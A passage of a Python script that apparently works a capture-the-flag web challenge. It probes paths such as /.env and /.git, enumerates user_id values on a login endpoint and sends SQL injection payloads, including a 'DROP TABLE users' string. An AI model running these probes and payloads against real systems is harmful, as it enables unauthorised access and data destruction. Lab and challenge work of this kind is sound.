    '/robots.txt', '/sitemap.xml', '/.env', '/.git',
]

found_endpoints = []
for endpoint in common_endpoints:
    try:
        r = session.get(f"{BASE_URL}{endpoint}", timeout=3, allow_redirects=False)
        if r.status_code != 404:
            print(f"{endpoint}: Status {r.status_code}, Length {len(r.text)}")
            found_endpoints.append((endpoint, r.status_code, len(r.text)))
            
            # Check for flags immediately
            if "FLAG{" in r.text:
                print(f"[!] FLAG FOUND at {endpoint}!\n{r.text}")
    except:
        pass

print(f"\n[SUMMARY] Found {len(found_endpoints)} non-404 endpoints")

print("\n" + "=" * 80)
print("[3] Check the welcome message variation with different user_ids")
print("=" * 80)

# Maybe the welcome message changes based on user_id?
headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'X-Requested-With': 'XMLHttpRequest'
}

test_range = list(range(10000, 10060))
for user_id in test_range:
    form_data = {'username': 'test', 'password': 'wrongpass', 'user_id': str(user_id)}
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
    
    # Extract welcome message if exists
    welcome = re.search(r'Welcome, ([^!<]+)', r.text)
    if welcome:
        name = welcome.group(1).strip()
        if name != "John Doe":
            print(f"\n[!] user_id={user_id}: Welcome '{name}'")
            print(f"Response length: {len(r.text)}")
    
    # Progress
    if user_id % 10 == 0:
        print(f"Progress: {user_id}/10060", end='\r')

print("\n" + "=" * 80)
print("[4] Check for SQL injection in user_id parameter")
print("=" * 80)

# Test SQL injection payloads
sqli_payloads = [
    "10032 OR 1=1",
    "10032' OR '1'='1",
    "10032'--",
    "10032; DROP TABLE users--",
    "10032 UNION SELECT * FROM users",
    "-1 OR 1=1",
    "(SELECT * FROM users)",
]

for payload in sqli_payloads:
    form_data = {'username': 'test', 'password': 'test', 'user_id': payload}
    r = session.post(f"{BASE_URL}/password/test", data=urlencode(form_data), headers=headers)
    
    error_indicators = ['sql', 'mysql', 'sqlite', 'error', 'syntax', 'exception']
    if any(ind in r.text.lower() for ind in error_indicators):
        print(f"\n[!] SQLi response with payload: {payload[:50]}")
        print(f"Response:\n{r.text[:1000]}")
    else:
        print(f"[X] Payload {payload[:30]}...: Status {r.status_code}")

print("\n" + "=" * 80)
print("[5] Search all responses for flag patterns")
print("=" * 80)

# Check various endpoints for flags
endpoints_to_check = ['/dashboard', '/password/test', '/password/flag', '/']
for endpoint in endpoints_to_check:
    r = session.get(f"{BASE_URL}{endpoint}")
    flag_matches = re.findall(r'FLAG\{[^}]+\}', r.text)
    if flag_matches:
        print(f"[!] FLAGS found at {endpoint}: {flag_matches}")

print("\n[DEEPER ANALYSIS COMPLETE]")

